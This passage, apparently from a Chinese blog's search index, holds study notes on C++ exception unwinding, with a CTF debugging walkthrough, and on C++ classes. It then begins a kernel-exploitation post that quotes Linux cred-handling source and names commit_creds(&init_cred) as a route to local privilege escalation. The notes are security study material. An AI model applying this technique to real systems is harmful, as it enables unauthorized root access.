sp, frameInfo.lsda,</span><br><span class="line">                                frameInfo.handler);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // If there is a personality routine, tell it we are unwinding.</span><br><span class="line">   if (frameInfo.handler != 0) &#123;</span><br><span class="line">     __personality_routine p =</span><br><span class="line">         (__personality_routine)(uintptr_t)(frameInfo.handler);</span><br><span class="line">     _Unwind_Action action = _UA_CLEANUP_PHASE;</span><br><span class="line">     if (sp == exception_object-&gt;private_2) &#123;</span><br><span class="line">       // Tell personality this was the frame it marked in phase 1.</span><br><span class="line">       action = (_Unwind_Action)(_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME);</span><br><span class="line">     &#125;</span><br><span class="line">      _Unwind_Reason_Code personalityResult =</span><br><span class="line">         (*p)(1, action, exception_object-&gt;exception_class, exception_object,</span><br><span class="line">              (struct _Unwind_Context *)(cursor));</span><br><span class="line">     switch (personalityResult) &#123;</span><br><span class="line">     case _URC_CONTINUE_UNWIND:</span><br><span class="line">       // Continue unwinding</span><br><span class="line">       _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">           &quot;unwind_phase2(ex_ojb=%p): _URC_CONTINUE_UNWIND&quot;,</span><br><span class="line">           (void *)exception_object);</span><br><span class="line">       if (sp == exception_object-&gt;private_2) &#123;</span><br><span class="line">         // Phase 1 said we would stop at this frame, but we did not...</span><br><span class="line">         _LIBUNWIND_ABORT(&quot;during phase1 personality function said it would &quot;</span><br><span class="line">                          &quot;stop here, but now in phase2 it did not stop here&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">       break;</span><br><span class="line">     case _URC_INSTALL_CONTEXT:</span><br><span class="line">       _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">           &quot;unwind_phase2(ex_ojb=%p): _URC_INSTALL_CONTEXT&quot;,</span><br><span class="line">           (void *)exception_object);</span><br><span class="line">       // Personality routine says to transfer control to landing pad.</span><br><span class="line">       // We may get control back if landing pad calls _Unwind_Resume().</span><br><span class="line">       if (_LIBUNWIND_TRACING_UNWINDING) &#123;</span><br><span class="line">         unw_word_t pc;</span><br><span class="line">         __unw_get_reg(cursor, UNW_REG_IP, &amp;pc);</span><br><span class="line">         __unw_get_reg(cursor, UNW_REG_SP, &amp;sp);</span><br><span class="line">         _LIBUNWIND_TRACE_UNWINDING(&quot;unwind_phase2(ex_ojb=%p): re-entering &quot;</span><br><span class="line">                                    &quot;user code with ip=0x%&quot; PRIxPTR</span><br><span class="line">                                    &quot;, sp=0x%&quot; PRIxPTR,</span><br><span class="line">                                    (void *)exception_object, pc, sp);</span><br><span class="line">       &#125;</span><br><span class="line">       __unw_resume(cursor);</span><br><span class="line">       // __unw_resume() only returns if there was an error.</span><br><span class="line">       return _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">     default:</span><br><span class="line">       // Personality routine returned an unknown result code.</span><br><span class="line">       _LIBUNWIND_DEBUG_LOG(&quot;personality function returned unknown result %d&quot;,</span><br><span class="line">                            personalityResult);</span><br><span class="line">       return _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> // Clean up phase did not resume at the frame that the search phase</span><br><span class="line"> // said it would...</span><br><span class="line"> return _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</blockquote>
<h5 id="4-异常处理"><a href="#4-异常处理" class="headerlink" title="4.异常处理"></a>4.异常处理</h5><blockquote>
<ul>
<li>对于被search phase标记的栈帧，landing pad调用<code>__cxa_begin_catch</code>，然后执行catch block中的代码，最后调用<code>__cxa_end_catch</code>销毁exception object</li>
</ul>
</blockquote>
<h3 id="3-关于文件结构"><a href="#3-关于文件结构" class="headerlink" title="3.关于文件结构"></a>3.关于文件结构</h3><blockquote>
<p>此部分描述了如何识别personality routine</p>
</blockquote>
<h2 id="四-调试"><a href="#四-调试" class="headerlink" title="四 调试"></a>四 调试</h2><blockquote>
<p>以2024羊城杯为例子</p>
</blockquote>
<h3 id="异常对象的空间分配与抛出"><a href="#异常对象的空间分配与抛出" class="headerlink" title="异常对象的空间分配与抛出"></a>异常对象的空间分配与抛出</h3><blockquote>
<p>初始全0</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> __cxa_allocate_exception@plt;</span><br><span class="line"><span class="number">0x586110</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">........................</span><br><span class="line"><span class="number">0x586190</span>:       <span class="number">0x00000000905f2923</span>      <span class="number">0x0000000000000f21</span></span><br><span class="line">__cxa_throw@plt;</span><br><span class="line">	调用： __cxa_get_globals@plt获得exception <span class="built_in">stack</span>存储在：<span class="number">0x7f9ec5b5f3a0</span></span><br><span class="line">	调用： __cxa_init_primary_exception@plt 来初始化__cxa_exception，结果如图：可以看出都被初始化。</span><br></pre></td></tr></table></figure>

<p><img src="/img/mypic/ABI/1.png" alt="image-20240903211022609"></p>
<h3 id="搜查阶段"><a href="#搜查阶段" class="headerlink" title="搜查阶段"></a>搜查阶段</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">调用：_Unwind_RaiseException@plt</span><br><span class="line">之后查找存在personality，则调用，可观察到此函数的第五个参数为一个链条这个也许就是</span><br><span class="line">    (<span class="keyword">struct</span> _Unwind_Context *)(cursor)</span><br></pre></td></tr></table></figure>

<p><img src="/img/mypic/ABI/image-20240903212603434.png" alt="image-20240903212603434"></p>
<p><img src="/img/mypic/ABI/image-20240903212615565.png" alt="image-20240903212615565"></p>
<blockquote>
<p>调用三次之后，终于在调用__gxx_personality_v0时找到处理函数，private被赋值，为：0x7ffffc2572d0</p>
</blockquote>
<p><img src="/img/mypic/ABI/image-20240903213114934.png" alt="image-20240903213114934"></p>
]]></content>
      <categories>
        <category>ABI</category>
      </categories>
      <tags>
        <tag>ABI</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/05/algorithm/%E5%9B%BE%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>C++类机制</title>
    <url>/2024/09/22/C++/%E7%B1%BB/</url>
    <content><![CDATA[<p>从现在开始从程序员的角度学习C++类的基础语法规则</p>
<h2 id="类基础"><a href="#类基础" class="headerlink" title="类基础"></a>类基础</h2><h4 id="1-组成"><a href="#1-组成" class="headerlink" title="1.组成"></a>1.组成</h4><p>类是由数据成员加函数组成的一种新的数据类型</p>
<h4 id="2-类成员的访问"><a href="#2-类成员的访问" class="headerlink" title="2.类成员的访问"></a>2.类成员的访问</h4><p>通过this指针，可以使成员函数可以访问成员变量，this指针作为成员函数的第一个隐式参数，当实例化类调用函数时，会将变量的地址传入this。</p>
<p>this的默认类型是指向非常量类型的常量指针，也就是说this本身不能变化，但是只能指向非常量类型，也就是const修饰的类类型无法使用，为了改善这一点，需要在函数参数后加上const关键字进行修饰。将this声明为指向常量类型的常量指针。</p>
<p>如：<code>std :: string isbn() const &#123; return bookNo; &#125;</code></p>
<p>const修饰一个类也可以有更加细腻的访问控制，mutable关键字修饰的类成员可以改变</p>
<h4 id="3-类成员的访问之作用域"><a href="#3-类成员的访问之作用域" class="headerlink" title="3.类成员的访问之作用域"></a>3.类成员的访问之作用域</h4><blockquote>
<p>访问数据需要保证数据的可达性，也就是作用域，需要考虑数据的声明以及定义</p>
</blockquote>
<p>类内的访问规则为：成员函数体可以随意访问成员变量，不需要考虑定义的位置。成员函数也可以定义在类的外部，但是需要和类声明相匹配。需要加类修饰符，类似于命名空间。</p>
<h4 id="4-类初始化"><a href="#4-类初始化" class="headerlink" title="4.类初始化"></a>4.类初始化</h4><p>类使用一个成员函数称为构造函数来进行类类型变量的初始化工作。若未定义构造函数，则编译器会默认提供一个称为默认构造函数。规则如下：类内数据若有初始值则直接初始化，否则进行默认初始化。只有当类没有任何构造函数，编译器才会生成。</p>
<h4 id="5-访问控制"><a href="#5-访问控制" class="headerlink" title="5.访问控制"></a>5.访问控制</h4><p>public，和privite比较基础，不多说了</p>
<p>另一种特殊的是友元规则，提供了更加细致的访问规则设置</p>
<h4 id="6-更深入特性"><a href="#6-更深入特性" class="headerlink" title="6.更深入特性"></a>6.更深入特性</h4><p>如：关于以构造函数为基本原理的隐式类型转换，静态成员，名字查找（编译原理相关），委托构造函数，函数重载等等。</p>
<h2 id="资源管理"><a href="#资源管理" class="headerlink" title="资源管理"></a>资源管理</h2><blockquote>
<p>开始以五个函数来展开，分别是拷贝构造函数，拷贝复制函数，移动构造函数，移动赋值函数，析构函数</p>
</blockquote>
<h4 id="1-拷贝构造函数"><a href="#1-拷贝构造函数" class="headerlink" title="1.拷贝构造函数"></a>1.拷贝构造函数</h4><blockquote>
<p>会调用拷贝构造函数：</p>
<ul>
<li><p>拷贝初始化</p>
</li>
<li><p>将一个对象作为实参传递给一个非引用类型的形参</p>
</li>
<li><p>从一个返回类型为非引用类型的函数返回一个对象</p>
</li>
<li><p>用花括号列表初始化一个数组中的元素或一个聚合类中的成员(参见7.5.5节,第<br>266页)</p>
</li>
</ul>
<p>很好解释了：</p>
<p>在函数调用过程中,具有非引用类型的参数要进行拷贝初始化(参见6.2.1节,第188<br>页)。类似的,当一个函数具有非引用的返回类型时,返回值会被用来初始化调用方的结<br>果(参见6.3.2节,第201页)。</p>
<p>拷贝构造函数被用来初始化非引用类类型参数,这一特性解释了为什么拷贝构造函数<br>自己的参数必须是引用类型。如果其参数不是引用类型,则调用永远也不会成功 – 为了<br>调用拷贝构造函数,我们必须拷贝它的实参,但为了拷贝实参,我们又需要调用拷贝构造<br>函数,如此无限循环。</p>
</blockquote>
<p>例子：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v1</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">//正确:直接初始化</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v2=<span class="number">10</span>;<span class="comment">//错误:接受大小参数的构造函数是explicit的</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(vector&lt;<span class="type">int</span>&gt;)</span></span>;<span class="comment">//f的参数进行拷贝初始化</span></span><br><span class="line"><span class="built_in">f</span>(<span class="number">10</span>);<span class="comment">//错误:不能用一个explicit的构造函数拷贝一个实参</span></span><br><span class="line"><span class="built_in">f</span>(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">10</span>));<span class="comment">// 正确:从一个int直接构造一个临时vector</span></span><br></pre></td></tr></table></figure>

<h4 id="2-析构函数"><a href="#2-析构函数" class="headerlink" title="2.析构函数"></a>2.析构函数</h4><blockquote>
<p>如同构造函数有一个初始化部分和一个函数体(参见7.5.1节,第257页),析构函数<br>也有一个函数体和一个析构部分。在一个构造函数中,成员的初始化是在函数体执行之前<br>完成的,且按照它们在类中出现的顺序进行初始化。在一个析构函数中,首先执行函数体,<br>然后销毁成员。成员按初始化顺序的逆序销毁。</p>
<p>在对象最后一次使用之后,析构函数的函数体可执行类设计者希望执行的任何收尾工<br>作。通常,析构函数释放对象在生存期分配的所有资源。</p>
<p>在一个析构函数中,不存在类似构造函数中初始化列表的东西来控制成员如何销毁,<br>析构部分是隐式的。成员销毁时发生什么完全依赖于成员的类型。销毁类类型的成员需要<br>执行成员自己的析构函数。内置类型没有析构函数,因此销毁内置类型成员什么也不需要<br>做。</p>
</blockquote>
<h4 id="3-两个重要法则"><a href="#3-两个重要法则" class="headerlink" title="3.两个重要法则"></a>3.两个重要法则</h4><ul>
<li>如果一个类需要一个拷贝构造函数,几乎可以肯定它也需要一个拷贝赋值运算符。反之亦然 – 如果一个类需要一个拷贝赋值运算符,几乎可以肯定它也需要一个拷贝构造函数。然而,无论是需要拷贝构造函数还是需要拷贝赋值<br>运算符都不必然意味着也需要析构函数。</li>
<li>如果一个类需要自定义析构函数,几乎可以肯定它也需要自定义拷贝赋值运算符和拷贝构造函数。</li>
</ul>
<h4 id="4-阻止拷贝"><a href="#4-阻止拷贝" class="headerlink" title="4.阻止拷贝"></a>4.阻止拷贝</h4><h4 id="5-类值的拷贝和类指针的拷贝"><a href="#5-类值的拷贝和类指针的拷贝" class="headerlink" title="5.类值的拷贝和类指针的拷贝"></a>5.类值的拷贝和类指针的拷贝</h4><p>以是否共享一个对象作为区分，需要在类的内部维护一定的状态</p>
<h2 id="面向对象程序设计"><a href="#面向对象程序设计" class="headerlink" title="面向对象程序设计"></a>面向对象程序设计</h2><p>面向对象程序设计(object-oriented programming)的核心思想是数据抽象、继承和动态绑定。通过使用数据抽象,我们可以将类的接口与实现分离(见第7章);使用继承,可以定义相似的类型并对其相似关系建模;使用动态绑定,可以在一定程度上忽略相似类型的区别,而以统一的方式使用它们的对象。</p>
<p>关于基类和派生类的定义基本和类相同，不同的是存在继承和细致的访问控制以及函数的特殊性。</p>
<p>基类会继承派生类所有东西，但是不一定所有元素都可以使用，可以通过protect等关键字进行调整。</p>
<h4 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1.初始化"></a>1.初始化</h4><p>需要注意一点，每个对象都对自己的数据负责，继承而来的数据，需要调用父类的构造函数来完成初始化操作。</p>
<h4 id="2-虚函数"><a href="#2-虚函数" class="headerlink" title="2.虚函数"></a>2.虚函数</h4><p>需要理解静态类型和动态类型，一个是编译时，一个是runtime。其次就可以理解什么是动态绑定了，说白了就是通过指针定位虚表来调用相应的虚函数，但是指针的实际类型只有在运行时才能知道，因此基本可以忽略静态类型，只考虑动态类型进行函数定位（以上讨论只能基于指针）</p>
<h4 id="3-析构"><a href="#3-析构" class="headerlink" title="3.析构"></a>3.析构</h4><p>需要将析构函数定义为虚函数，否则无法正确删除对象</p>
<h4 id="4-访问规则"><a href="#4-访问规则" class="headerlink" title="4.访问规则"></a>4.访问规则</h4><p>在 C++ 中，继承的成员访问规则主要取决于继承方式（<code>public</code>、<code>protected</code>、<code>private</code>）和成员的访问权限（<code>public</code>、<code>protected</code>、<code>private</code>）。总结如下：</p>
<ol>
<li><strong>继承方式对成员访问的影响</strong></li>
</ol>
<ul>
<li><strong>Public 继承</strong>：<ul>
<li>基类的 <code>public</code> 成员在派生类中仍然是 <code>public</code>。</li>
<li>基类的 <code>protected</code> 成员在派生类中仍然是 <code>protected</code>。</li>
<li>基类的 <code>private</code> 成员不能在派生类中直接访问。</li>
</ul>
</li>
<li><strong>Protected 继承</strong>：<ul>
<li>基类的 <code>public</code> 成员在派生类中变为 <code>protected</code>。</li>
<li>基类的 <code>protected</code> 成员在派生类中仍然是 <code>protected</code>。</li>
<li>基类的 <code>private</code> 成员不能在派生类中直接访问。</li>
</ul>
</li>
<li><strong>Private 继承</strong>：<ul>
<li>基类的 <code>public</code> 和 <code>protected</code> 成员在派生类中都变为 <code>private</code>。</li>
<li>基类的 <code>private</code> 成员不能在派生类中直接访问。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>成员访问权限的影响</strong></li>
</ol>
<ul>
<li><strong>Public 成员</strong>：在 <code>public</code> 继承中，基类的 <code>public</code> 成员可以被派生类对象和派生类外部访问。</li>
<li><strong>Protected 成员</strong>：只能被基类和派生类中的成员函数访问，外部无法直接访问。</li>
<li><strong>Private 成员</strong>：只能在基类中访问，派生类和外部均无法直接访问。</li>
</ul>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel(Local Privilege Escalation)</title>
    <url>/2024/08/19/kernelpwn/kernelstack/</url>
    <content><![CDATA[<p>摘抄自<a href="https://pawnyable.cafe/linux-kernel/introduction/security.html">https://pawnyable.cafe/linux-kernel/introduction/security.html</a></p>
<p>部分参考：<a href="http://video.mobisys.cc/materials/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3linux%E5%86%85%E6%A0%B8.pdf">深入理解LINUX内核</a></p>
<p><a href="https://yuanfentiank789.github.io/2016/12/31/security1/">https://yuanfentiank789.github.io/2016/12/31/security1/</a></p>
<p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/euid-ruid-suid">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/euid-ruid-suid</a></p>
<h2 id="task-struct部分结构"><a href="#task-struct部分结构" class="headerlink" title="task_struct部分结构"></a>task_struct部分结构</h2><blockquote>
<p>主要考虑其中的指向cred的指针</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">/ include / linux / sched.h</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="访问权限相关"><a href="#访问权限相关" class="headerlink" title="访问权限相关"></a>访问权限相关</h2><blockquote>
<p>从 Linux 内核 6.2&#96;&#96; 开始<a href="https://elixir.bootlin.com/linux/v6.2/source/kernel/cred.c#L712">，NULL 不能再传递给 prepare_kernel_cred。</a></p>
<p><code>init_cred</code>仍然存在，因此您可以通过执行 <code>commit_creds （&amp;init_cred）</code> 来进行LPE。</p>
</blockquote>
<h3 id="CRED"><a href="#CRED" class="headerlink" title="CRED"></a>CRED</h3><blockquote>
<p>UID:<strong>真实用户ID</strong> ，表示发起进程的用户</p>
<p>EUID:被称为<strong>有效用户ID</strong> ，它代表系统用来确定进程权限的用户身份。</p>
<p>SUID:当高权限进程（通常以 root 身份运行）需要暂时放弃其权限来执行某些任务，以便稍后恢复其初始提升状态时，此<strong>保存的用户 ID</strong>至关重要。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/include / linux / cred.h </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> /kernel / cred.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">	.usage			= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line">	.uid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.gid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.suid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.sgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.euid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.egid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.fsuid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.fsgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.securebits		= SECUREBITS_DEFAULT,</span><br><span class="line">	.cap_inheritable	= CAP_EMPTY_SET,</span><br><span class="line">	.cap_permitted		= CAP_FULL_SET,</span><br><span class="line">	.cap_effective		= CAP_FULL_SET,</span><br><span class="line">	.cap_bset		= CAP_FULL_SET,</span><br><span class="line">	.user			= INIT_USER,</span><br><span class="line">	.user_ns		= &amp;init_user_ns,</span><br><span class="line">	.group_info		= &amp;init_groups,</span><br><span class="line">	.ucounts		= &amp;init_ucounts,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="cred结构的创建"><a href="#cred结构的创建" class="headerlink" title="cred结构的创建"></a>cred结构的创建</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*5.14.9*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/kernel / cred.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">	validate_creds(old);</span><br><span class="line"></span><br><span class="line">	*new = *old;</span><br><span class="line">	new-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	<span class="type">atomic_set</span>(&amp;new-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(new, <span class="number">0</span>);</span><br><span class="line">	get_uid(new-&gt;user);</span><br><span class="line">	get_user_ns(new-&gt;user_ns);</span><br><span class="line">	get_group_info(new-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	new-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	new-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	new-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	new-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line">	new-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	new-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	new-&gt;ucounts = get_ucounts(new-&gt;ucounts);</span><br><span class="line">	<span class="keyword">if</span> (!new-&gt;ucounts)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(new, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	put_cred(old);</span><br><span class="line">	validate_creds(new);</span><br><span class="line">	<span class="keyword">return</span> new;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	put_cred(new);</span><br><span class="line">	put_cred(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="cred的更改"><a href="#cred的更改" class="headerlink" title="cred的更改"></a>cred的更改</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/kernel / cred.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;commit_creds(%p&#123;%ld&#125;)&quot;</span>, new,</span><br><span class="line">	       atomic_long_read(&amp;new-&gt;usage));</span><br><span class="line"></span><br><span class="line">	BUG_ON(task-&gt;cred != old);</span><br><span class="line">	BUG_ON(atomic_long_read(&amp;new-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	get_cred(new); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* dumpability changes */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(old-&gt;euid, new-&gt;euid) 